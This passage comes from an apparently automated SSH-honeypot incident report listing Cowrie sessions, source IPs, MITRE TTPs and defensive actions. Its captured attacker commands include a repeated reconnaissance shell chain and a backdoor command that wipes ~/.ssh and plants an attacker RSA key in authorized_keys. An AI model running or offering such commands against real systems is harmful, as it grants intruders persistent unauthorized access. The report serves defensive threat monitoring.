| `2026-07-09 17:13:06` | `cowrie.log.closed` |
| `2026-07-09 17:13:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]12` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]12` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-83b5aefab864

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]12` |
| **First Seen** | 2026-07-09 17:14 |
| **Last Seen** | 2026-07-09 17:14 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 17:14:42` | `cowrie.session.connect` |
| `2026-07-09 17:14:43` | `cowrie.client.version` |
| `2026-07-09 17:14:43` | `cowrie.client.kex` |
| `2026-07-09 17:14:45` | `cowrie.login.success` |
| `2026-07-09 17:14:46` | `cowrie.session.params` |
| `2026-07-09 17:14:46` | `cowrie.command.input` |
| `2026-07-09 17:14:46` | `cowrie.command.input` |
| `2026-07-09 17:14:46` | `cowrie.command.input` |
| `2026-07-09 17:14:46` | `cowrie.command.input` |
| `2026-07-09 17:14:46` | `cowrie.command.input` |
| `2026-07-09 17:14:46` | `cowrie.command.success` |
| `2026-07-09 17:14:46` | `cowrie.command.input` |
| `2026-07-09 17:14:46` | `cowrie.command.input` |
| `2026-07-09 17:14:46` | `cowrie.command.input` |
| `2026-07-09 17:14:46` | `cowrie.command.input` |
| `2026-07-09 17:14:47` | `cowrie.log.closed` |
| `2026-07-09 17:14:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]12` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]12` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b644b95099b0

| Field | Detail |
|---|---|
| **Source IP** | `196.188.187[.]205` |
| **First Seen** | 2026-07-09 17:14 |
| **Last Seen** | 2026-07-09 17:15 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 17:14:58` | `cowrie.session.connect` |
| `2026-07-09 17:14:59` | `cowrie.client.version` |
| `2026-07-09 17:14:59` | `cowrie.client.kex` |
| `2026-07-09 17:15:01` | `cowrie.login.success` |
| `2026-07-09 17:15:02` | `cowrie.direct-tcpip.request` |
| `2026-07-09 17:15:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `196.188.187[.]205` to AbuseIPDB if not already reported
- [ ] Block `196.188.187[.]205` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1e1e4cc59f60

| Field | Detail |
|---|---|
| **Source IP** | `203.252.10[.]3` |
| **First Seen** | 2026-07-09 17:15 |
| **Last Seen** | 2026-07-09 17:15 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 17:15:07` | `cowrie.session.connect` |
| `2026-07-09 17:15:08` | `cowrie.client.version` |
| `2026-07-09 17:15:08` | `cowrie.client.kex` |
| `2026-07-09 17:15:10` | `cowrie.login.success` |
| `2026-07-09 17:15:10` | `cowrie.direct-tcpip.request` |
| `2026-07-09 17:15:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `203.252.10[.]3` to AbuseIPDB if not already reported
- [ ] Block `203.252.10[.]3` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2977da173d72

| Field | Detail |
|---|---|
| **Source IP** | `117.70.94[.]155` |
| **First Seen** | 2026-07-09 17:17 |
| **Last Seen** | 2026-07-09 17:18 |
| **Session Duration** | 16s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 17:17:57` | `cowrie.session.connect` |
| `2026-07-09 17:17:59` | `cowrie.client.version` |
| `2026-07-09 17:17:59` | `cowrie.client.kex` |
| `2026-07-09 17:18:06` | `cowrie.login.success` |
| `2026-07-09 17:18:09` | `cowrie.direct-tcpip.request` |
| `2026-07-09 17:18:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `117.70.94[.]155` to AbuseIPDB if not already reported
- [ ] Block `117.70.94[.]155` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b385f100b65d

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-09 17:18 |
| **Last Seen** | 2026-07-09 17:18 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 17:18:02` | `cowrie.session.connect` |
| `2026-07-09 17:18:03` | `cowrie.client.version` |
| `2026-07-09 17:18:03` | `cowrie.client.kex` |
| `2026-07-09 17:18:09` | `cowrie.login.success` |
| `2026-07-09 17:18:13` | `cowrie.session.params` |
| `2026-07-09 17:18:13` | `cowrie.command.input` |
| `2026-07-09 17:18:14` | `cowrie.log.closed` |
| `2026-07-09 17:18:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-39a152354ce9

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]12` |
| **First Seen** | 2026-07-09 17:18 |
| **Last Seen** | 2026-07-09 17:18 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 17:18:10` | `cowrie.session.connect` |
| `2026-07-09 17:18:10` | `cowrie.client.version` |
| `2026-07-09 17:18:10` | `cowrie.client.kex` |
| `2026-07-09 17:18:13` | `cowrie.login.success` |
| `2026-07-09 17:18:14` | `cowrie.session.params` |
| `2026-07-09 17:18:14` | `cowrie.command.input` |
| `2026-07-09 17:18:14` | `cowrie.command.input` |
| `2026-07-09 17:18:14` | `cowrie.command.input` |
| `2026-07-09 17:18:14` | `cowrie.command.input` |
| `2026-07-09 17:18:14` | `cowrie.command.input` |
| `2026-07-09 17:18:14` | `cowrie.command.success` |
| `2026-07-09 17:18:14` | `cowrie.command.input` |
| `2026-07-09 17:18:14` | `cowrie.command.input` |
| `2026-07-09 17:18:14` | `cowrie.command.input` |
| `2026-07-09 17:18:14` | `cowrie.command.input` |
| `2026-07-09 17:18:14` | `cowrie.log.closed` |
| `2026-07-09 17:18:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]12` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]12` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-38fa872dcd5d

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]12` |
| **First Seen** | 2026-07-09 17:19 |
| **Last Seen** | 2026-07-09 17:19 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 17:19:44` | `cowrie.session.connect` |
| `2026-07-09 17:19:44` | `cowrie.client.version` |
| `2026-07-09 17:19:44` | `cowrie.client.kex` |
| `2026-07-09 17:19:45` | `cowrie.login.success` |
| `2026-07-09 17:19:46` | `cowrie.session.params` |
| `2026-07-09 17:19:46` | `cowrie.command.input` |
| `2026-07-09 17:19:46` | `cowrie.command.input` |
| `2026-07-09 17:19:46` | `cowrie.command.input` |
| `2026-07-09 17:19:46` | `cowrie.command.input` |
| `2026-07-09 17:19:46` | `cowrie.command.input` |
| `2026-07-09 17:19:46` | `cowrie.command.success` |
| `2026-07-09 17:19:46` | `cowrie.command.input` |
| `2026-07-09 17:19:46` | `cowrie.command.input` |
| `2026-07-09 17:19:46` | `cowrie.command.input` |
| `2026-07-09 17:19:46` | `cowrie.command.input` |
| `2026-07-09 17:19:46` | `cowrie.log.closed` |
| `2026-07-09 17:19:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]12` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]12` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3fdcb8977fa7

| Field | Detail |
|---|---|
| **Source IP** | `62.201.253[.]23` |
| **First Seen** | 2026-07-09 17:20 |
| **Last Seen** | 2026-07-09 17:20 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 17:20:51` | `cowrie.session.connect` |
| `2026-07-09 17:20:51` | `cowrie.client.version` |
| `2026-07-09 17:20:51` | `cowrie.client.kex` |
| `2026-07-09 17:20:53` | `cowrie.login.success` |
| `2026-07-09 17:20:53` | `cowrie.direct-tcpip.request` |
| `2026-07-09 17:20:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `62.201.253[.]23` to AbuseIPDB if not already reported
- [ ] Block `62.201.253[.]23` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3ac9055a9312

| Field | Detail |
|---|---|
| **Source IP** | `118.163.145[.]175` |
| **First Seen** | 2026-07-09 17:21 |
| **Last Seen** | 2026-07-09 17:21 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 17:21:03` | `cowrie.session.connect` |
| `2026-07-09 17:21:04` | `cowrie.client.version` |
| `2026-07-09 17:21:04` | `cowrie.client.kex` |
| `2026-07-09 17:21:06` | `cowrie.login.success` |
| `2026-07-09 17:21:07` | `cowrie.direct-tcpip.request` |
| `2026-07-09 17:21:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.163.145[.]175` to AbuseIPDB if not already reported
- [ ] Block `118.163.145[.]175` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-80a5ffc68127

| Field | Detail |
|---|---|
| **Source IP** | `185.242.3[.]195` |
| **First Seen** | 2026-07-09 17:21 |
| **Last Seen** | 2026-07-09 17:21 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 17:21:08` | `cowrie.session.connect` |
| `2026-07-09 17:21:09` | `cowrie.client.version` |
| `2026-07-09 17:21:09` | `cowrie.client.kex` |
| `2026-07-09 17:21:09` | `cowrie.login.success` |
| `2026-07-09 17:21:10` | `cowrie.session.params` |
| `2026-07-09 17:21:10` | `cowrie.command.input` |
| `2026-07-09 17:21:10` | `cowrie.log.closed` |
| `2026-07-09 17:21:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.242.3[.]195` to AbuseIPDB if not already reported
- [ ] Block `185.242.3[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2c2f94b800b3

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]12` |
| **First Seen** | 2026-07-09 17:21 |
| **Last Seen** | 2026-07-09 17:21 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 17:21:21` | `cowrie.session.connect` |
| `2026-07-09 17:21:21` | `cowrie.client.version` |
| `2026-07-09 17:21:21` | `cowrie.client.kex` |
| `2026-07-09 17:21:22` | `cowrie.login.success` |
| `2026-07-09 17:21:24` | `cowrie.session.params` |
| `2026-07-09 17:21:24` | `cowrie.command.input` |
| `2026-07-09 17:21:24` | `cowrie.command.input` |
| `2026-07-09 17:21:24` | `cowrie.command.input` |
| `2026-07-09 17:21:24` | `cowrie.command.input` |
| `2026-07-09 17:21:24` | `cowrie.command.input` |
| `2026-07-09 17:21:24` | `cowrie.command.success` |
| `2026-07-09 17:21:24` | `cowrie.command.input` |
| `2026-07-09 17:21:24` | `cowrie.command.input` |
| `2026-07-09 17:21:24` | `cowrie.command.input` |
| `2026-07-09 17:21:24` | `cowrie.command.input` |
| `2026-07-09 17:21:24` | `cowrie.log.closed` |
| `2026-07-09 17:21:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]12` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]12` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-00b4eeb10ab3

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]12` |
| **First Seen** | 2026-07-09 17:23 |
| **Last Seen** | 2026-07-09 17:23 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 17:23:00` | `cowrie.session.connect` |
| `2026-07-09 17:23:00` | `cowrie.client.version` |
| `2026-07-09 17:23:00` | `cowrie.client.kex` |
| `2026-07-09 17:23:01` | `cowrie.login.success` |
| `2026-07-09 17:23:02` | `cowrie.session.params` |
| `2026-07-09 17:23:02` | `cowrie.command.input` |
| `2026-07-09 17:23:02` | `cowrie.command.input` |
| `2026-07-09 17:23:02` | `cowrie.command.input` |
| `2026-07-09 17:23:02` | `cowrie.command.input` |
| `2026-07-09 17:23:02` | `cowrie.command.input` |
| `2026-07-09 17:23:02` | `cowrie.command.success` |
| `2026-07-09 17:23:02` | `cowrie.command.input` |
| `2026-07-09 17:23:02` | `cowrie.command.input` |
| `2026-07-09 17:23:02` | `cowrie.command.input` |
| `2026-07-09 17:23:02` | `cowrie.command.input` |
| `2026-07-09 17:23:02` | `cowrie.log.closed` |
| `2026-07-09 17:23:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]12` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]12` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-67c83c1210c0

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]12` |
| **First Seen** | 2026-07-09 17:24 |
| **Last Seen** | 2026-07-09 17:24 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 17:24:41` | `cowrie.session.connect` |
| `2026-07-09 17:24:42` | `cowrie.client.version` |
| `2026-07-09 17:24:42` | `cowrie.client.kex` |
| `2026-07-09 17:24:42` | `cowrie.login.success` |
| `2026-07-09 17:24:43` | `cowrie.session.params` |
| `2026-07-09 17:24:43` | `cowrie.command.input` |
| `2026-07-09 17:24:43` | `cowrie.command.input` |
| `2026-07-09 17:24:43` | `cowrie.command.input` |
| `2026-07-09 17:24:43` | `cowrie.command.input` |
| `2026-07-09 17:24:43` | `cowrie.command.input` |
| `2026-07-09 17:24:43` | `cowrie.command.success` |
| `2026-07-09 17:24:43` | `cowrie.command.input` |
| `2026-07-09 17:24:43` | `cowrie.command.input` |
| `2026-07-09 17:24:43` | `cowrie.command.input` |
| `2026-07-09 17:24:43` | `cowrie.command.input` |
| `2026-07-09 17:24:43` | `cowrie.log.closed` |
| `2026-07-09 17:24:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]12` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]12` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-70843155bea6

| Field | Detail |
|---|---|
| **Source IP** | `5.99.196[.]202` |
| **First Seen** | 2026-07-09 17:24 |
| **Last Seen** | 2026-07-09 17:25 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 17:24:56` | `cowrie.session.connect` |
| `2026-07-09 17:24:56` | `cowrie.client.version` |
| `2026-07-09 17:24:56` | `cowrie.client.kex` |
| `2026-07-09 17:24:56` | `cowrie.login.success` |
| `2026-07-09 17:24:57` | `cowrie.session.params` |
| `2026-07-09 17:24:57` | `cowrie.command.input` |
| `2026-07-09 17:24:57` | `cowrie.command.failed` |
| `2026-07-09 17:24:57` | `cowrie.log.closed` |
| `2026-07-09 17:24:58` | `cowrie.session.params` |
| `2026-07-09 17:24:58` | `cowrie.command.input` |
| `2026-07-09 17:24:58` | `cowrie.session.file_download` |
| `2026-07-09 17:24:58` | `cowrie.log.closed` |
| `2026-07-09 17:25:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `5.99.196[.]202` to AbuseIPDB if not already reported
- [ ] Block `5.99.196[.]202` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f4cda74d1ff9

| Field | Detail |
|---|---|
| **Source IP** | `5.99.196[.]202` |
| **First Seen** | 2026-07-09 17:24 |
| **Last Seen** | 2026-07-09 17:24 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 17:24:58` | `cowrie.session.connect` |
| `2026-07-09 17:24:58` | `cowrie.client.version` |
| `2026-07-09 17:24:58` | `cowrie.client.kex` |
| `2026-07-09 17:24:59` | `cowrie.login.success` |
| `2026-07-09 17:24:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `5.99.196[.]202` to AbuseIPDB if not already reported
- [ ] Block `5.99.196[.]202` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7e644ba91684

| Field | Detail |
|---|---|
| **Source IP** | `5.99.196[.]202` |
| **First Seen** | 2026-07-09 17:24 |
| **Last Seen** | 2026-07-09 17:25 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 17:24:59` | `cowrie.session.connect` |
| `2026-07-09 17:24:59` | `cowrie.client.version` |
| `2026-07-09 17:24:59` | `cowrie.client.kex` |
| `2026-07-09 17:25:00` | `cowrie.login.success` |
| `2026-07-09 17:25:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `5.99.196[.]202` to AbuseIPDB if not already reported
- [ ] Block `5.99.196[.]202` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9ad08c73b3eb

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]12` |
| **First Seen** | 2026-07-09 17:26 |
| **Last Seen** | 2026-07-09 17:26 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 17:26:23` | `cowrie.session.connect` |
| `2026-07-09 17:26:23` | `cowrie.client.version` |
| `2026-07-09 17:26:24` | `cowrie.client.kex` |
| `2026-07-09 17:26:24` | `cowrie.login.success` |
| `2026-07-09 17:26:25` | `cowrie.session.params` |
| `2026-07-09 17:26:25` | `cowrie.command.input` |
| `2026-07-09 17:26:25` | `cowrie.command.input` |
| `2026-07-09 17:26:25` | `cowrie.command.input` |
| `2026-07-09 17:26:25` | `cowrie.command.input` |
| `2026-07-09 17:26:25` | `cowrie.command.input` |
| `2026-07-09 17:26:25` | `cowrie.command.success` |
| `2026-07-09 17:26:25` | `cowrie.command.input` |
| `2026-07-09 17:26:25` | `cowrie.command.input` |
| `2026-07-09 17:26:25` | `cowrie.command.input` |
| `2026-07-09 17:26:25` | `cowrie.command.input` |
| `2026-07-09 17:26:25` | `cowrie.log.closed` |
